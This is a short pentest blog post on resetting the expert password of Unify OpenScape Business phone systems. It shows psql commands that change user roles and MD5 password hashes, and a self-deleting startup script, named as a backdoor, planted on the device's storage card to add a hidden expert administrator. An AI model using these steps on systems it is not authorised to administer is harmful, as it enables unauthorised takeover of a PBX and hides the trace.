---
title: "Unify OSBiz Reset Pass"
date: 2022-02-11T22:35:43+01:00
draft: false
tags:
- Unify
- OSBiz
- Pentest
---

Imaging that you don't know your OSBiz WBM expert password anymore, the expert role have the highest permission level possible in the WBM portal. What can you do? 
* For an Openscape Business S system you can easily change the password on the terminal, because we do have root access. We can change this with postgresql:
```bash
OSbizS:~ # psql hipath postgres
hipath=# SELECT * from as_login_data;
login_user_id | login_user_role |   login_user_name    |     login_user_firstname     | login_user_lastname |        login_user_passwd         | login_user_language | login_user_session_id | login_user_not_first 
---------------+-----------------+----------------------+------------------------------+---------------------+----------------------------------+---------------------+-----------------------+----------------------
             0 | 2               | administrator@system | system default administrator |                     | 1fd629412d8276617303326f650bc553 | de                  |                       | t
             1 | 4               | expert@system        |                              |                     | 15e32f69ceb52b8a179cdd274cbbaaf1 | de                  |                     0 | t
             2 | 5               | customer@system      |                              |                     | 1ee99c48baf212bc1173718cc3fc1bf6 | de                  |                     0 | t
(3 rows)
#Change customer@system to expert role (equals 4):
hipath=# UPDATE as_login_data SET login_user_role = 4 WHERE login_user_id = 2;
UPDATE 1
hipath=# SELECT * FROM as_login_data;
 login_user_id | login_user_role |   login_user_name    |     login_user_firstname     | login_user_lastname |        login_user_passwd         | login_user_language | login_user_session_id | login_user_not_first 
---------------+-----------------+----------------------+------------------------------+---------------------+----------------------------------+---------------------+-----------------------+----------------------
             0 | 2               | administrator@system | system default administrator |                     | 1fd629412d8276617303326f650bc553 | de                  |                       | t
             1 | 4               | expert@system        |                              |                     | 15e32f69ceb52b8a179cdd274cbbaaf1 | de                  |                     0 | t
             2 | 4               | customer@system      |                              |                     | 1ee99c48baf212bc1173718cc3fc1bf6 | de                  |                     0 | t
(3 rows)
#Change password from known user
hipath=# UPDATE as_login_data SET login_user_passwd = '5f4dcc3b5aa765d61d8327deb882cf99' WHERE login_user_id = 2;
UPDATE 1
hipath=# \q 
```

&nbsp;
### Create MD5 postgres hash
To create an md5 password for PostgreSQL, use following command (-n to not include newline char):
```bash
OSbizS:~ # echo -n "password" | md5sum
5f4dcc3b5aa765d61d8327deb882cf99
```

&nbsp;
### Create reset script
If you forgot the password from you X-variant system you'll not have access to the root terminal. I did found out a way on how to accomplish this, we need to create a bash script on the SDHC/NVMe card that will execute during the system startup. Shutdown the PABX and plug the SDHC/NVMe card into your linux pc. 

Create the bash script inside the directory **/media/braam/OCCE/persistent/Startup_files/commserv.d**, we'll give it a name like to other files. The index number is the order number in which the main script will execute all the scripts available inside this commserv.d directory.
```bash
cd /media/braam/OCCE/persistent/Startup_files/commserv.d
touch 950A-backdoor.sh
chmod +x 950A-backdoor.sh
chown 988 950A-backdoor.sh
```

**Content 950A-backdoor.sh**
```bash
#!/bin/sh
#Password eq password, also forced to enter new on first login. User placed on index 9 in database.
psql  -U postgres -t -A -d hipath -c "INSERT INTO as_login_data (login_user_id, login_user_role, login_user_name, login_user_passwd) VALUES(9,4,'bkm_unify@system','5f4dcc3b5aa765d61d8327deb882cf99');" >/dev/null
rm -- "$0" #self destruct
exit 0
```

Now place the SDHC/NVMe card back in the PABX system and start it up, login with the user bkm_unify@system and password "password". After this choose a new password. 
The script will be deleted once executed (self destruct).
